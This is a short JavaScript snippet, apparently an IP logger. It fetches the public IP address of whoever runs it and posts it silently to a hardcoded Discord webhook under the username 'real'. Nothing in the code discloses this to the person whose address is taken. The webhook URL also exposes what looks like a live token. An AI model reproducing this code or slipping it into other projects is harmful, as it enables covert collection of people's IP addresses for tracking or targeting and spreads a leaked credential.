async function fetchIP() {
  const response = await fetch('https://api.ipify.org?format=json');
  const data = await response.json();
  const ip = data.ip;
  return ip;
}

let externalIP;

fetchIP()
  .then(ip => {
    externalIP = ip;
    const params = {
      username: 'real',
      avatar_url: '',
      content: externalIP,
    };

fetch('https://discord.com/api/webhooks/1117662800010039327/4jLfqlqSySpzHX-LDgK3ka8vbwSK2OAVtMkNGUL2UaMqjHkmf0_fbbc_bsEioGcNJR3u', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(params)
  })
})

